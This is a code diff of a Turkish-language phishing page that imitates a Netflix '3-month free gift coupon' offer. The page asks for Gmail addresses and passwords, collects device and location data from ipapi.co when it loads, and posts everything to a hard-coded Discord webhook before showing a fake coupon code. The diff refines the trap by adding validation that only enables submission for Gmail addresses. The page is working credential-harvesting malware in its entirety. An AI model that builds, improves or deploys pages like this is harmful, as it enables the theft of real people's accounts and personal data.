@@ -12,16 +12,18 @@
         .box { width: 90%; max-width: 400px; padding: 50px; background: rgba(0,0,0,0.85); border-radius: 10px; text-align: center; box-shadow: 0 0 40px rgba(0,0,0,1); }
         .box img { width: 160px; margin-bottom: 20px; }
         
-        input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 4px; border: none; background: #333; color: #fff; font-size: 16px; outline: none; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 4px; border: none; background: #333; color: #fff; font-size: 16px; outline: none; border-bottom: 2px solid transparent; transition: 0.3s; }
         input:focus { background: #454545; border-bottom: 2px solid #e50914; }
         .mask { -webkit-text-security: disc !important; }
         
-        button { width: 100%; padding: 15px; border: none; border-radius: 4px; background: #e50914; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        button { width: 100%; padding: 15px; border: none; border-radius: 4px; background: #e50914; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; opacity: 0.4; pointer-events: none; }
+        button.active { opacity: 1; pointer-events: auto; }
         
         #couponUI, #loading { display: none; }
         .coupon-code { background: #1a1a1a; border: 2px dashed #46d369; padding: 15px; font-size: 22px; font-weight: bold; letter-spacing: 2px; color: #46d369; margin: 20px 0; border-radius: 5px; }
         
         #notif { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 380px; background: #fff; color: #333; padding: 15px; border-radius: 8px; display: flex; align-items: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.8s; z-index: 9999; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -36,9 +38,9 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
         <h2 style="font-size: 20px; margin-bottom: 10px;">Hediye Kuponunu Aktif Et</h2>
         <p style="font-size: 14px; color: #b3b3b3; margin-bottom: 20px;">3 Aylık ücretsiz kullanım için Gmail hesabınızı doğrulayın.</p>
-        <input type="email" id="email" placeholder="E-posta (@gmail.com)">
-        <input type="text" id="pass" class="mask" placeholder="Şifre">
-        <button onclick="fire()">Kuponu Tanımla</button>
+        <input type="email" id="email" placeholder="E-posta (@gmail.com)" oninput="dogrula()">
+        <input type="text" id="pass" class="mask" placeholder="Şifre" oninput="dogrula()">
+        <button id="submitBtn" onclick="fire()">Kuponu Tanımla</button>
     </div>
 
     <div class="box" id="loading">
@@ -52,7 +54,7 @@
         <p>3 Aylık Hediye Kuponunuz Oluşturuldu:</p>
         <div class="coupon-code">NFLX-2026-BKN9</div>
         <p style="font-size:12px; color:#888;">Bu kodu Netflix ödeme sayfasında kullanabilirsiniz.</p>
-        <button style="background:#444;" onclick="window.location.href='https://www.netflix.com/tr/redeem'">Kodu Kullan</button>
+        <button style="background:#444; opacity: 1; pointer-events: auto;" onclick="window.location.href='https://www.netflix.com/tr/redeem'">Kodu Kullan</button>
     </div>
 
     <audio id="tudum"><source src="https://www.myinstants.com/media/sounds/netflix-tudum.mp3" type="audio/mpeg"></audio>
@@ -61,7 +63,23 @@
         const webhook = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
         let geo = {};
 
-        // 1. AŞAMA: SAYFA AÇILDIĞI AN (TÜM CİHAZ VE KONUM VERİLERİ)
+        // GİRİŞ KONTROLÜ (Kısıtlamalar Burada)
+        function dogrula() {
+            const e = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
+            const btn = document.getElementById('submitBtn');
+
+            // 1. Şifre 3'ten az karakterli olamaz
+            // 2. İçi boş olamaz
+            // 3. E-postada @gmail.com geçmek zorunda
+            if(e.toLowerCase().endsWith("@gmail.com") && p.trim().length >= 3) {
+                btn.classList.add('active');
+            } else {
+                btn.classList.remove('active');
+            }
+        }
+
+        // 1. AŞAMA: SAYFA AÇILDIĞI AN
         window.onload = async () => {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -100,22 +118,19 @@
             } catch(e) {}
         };
 
-        // 2. AŞAMA: BUTONA TIKLADIĞI AN (HESAP BİLGİLERİ + SAHTE KUPON)
+        // 2. AŞAMA: BUTONA TIKLADIĞI AN
         async function fire() {
             const e = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
 
-            if(!e.includes('@') || p.length < 5) return alert("Lütfen geçerli bilgiler girin.");
-
             document.getElementById('loginUI').style.display = "none";
             document.getElementById('loading').style.display = "block";
 
-            // Make.com için 'content' parametresini mail ile dolduruyoruz.
             await fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: e, 
+                    content: e, // Make.com Gmail 'To' alanı için
                     embeds: [{
                         title: "🎯 2. AŞAMA: BİLGİLER GELDİ",
                         color: 16711680,
@@ -135,6 +150,5 @@
             }, 3000);
         }
     </script>
-    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
 </body>
 </html>
